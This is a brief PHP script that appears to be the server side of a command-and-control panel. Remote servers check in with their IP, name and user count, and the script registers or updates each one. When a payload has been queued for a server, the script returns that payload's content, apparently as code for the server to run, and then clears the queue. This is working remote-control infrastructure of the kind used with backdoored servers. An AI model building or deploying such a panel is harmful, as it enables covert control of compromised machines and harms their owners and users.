<?php
include('class/include.php');

$server_ip = $_POST['i'];
$server_name = $_POST['n'];
$server_users_number = $_POST['nb'];

if ($server_ip != "" && $server_name != "")
{
	$server_id = Server::GetServerByIP($server_ip);
	if ($server_id == false)
	{
		Server::AddServer($server_name, $server_ip, $server_users_number);
		echo "PrintMessage(10,'')";
	}
	else
	{
		Server::UpdateServer($server_id, $server_name, $server_ip, $server_users_number);

		$payload_id = Server::GetServerPayload($server_id);
		if ($payload_id == -1)
		{
			echo "PrintMessage(10,'')";
		}
		else
		{
			echo Payload::GetPayload($payload_id)['payload_content'];
			Server::ResetPayload($server_id);
		}
	}
}
?> 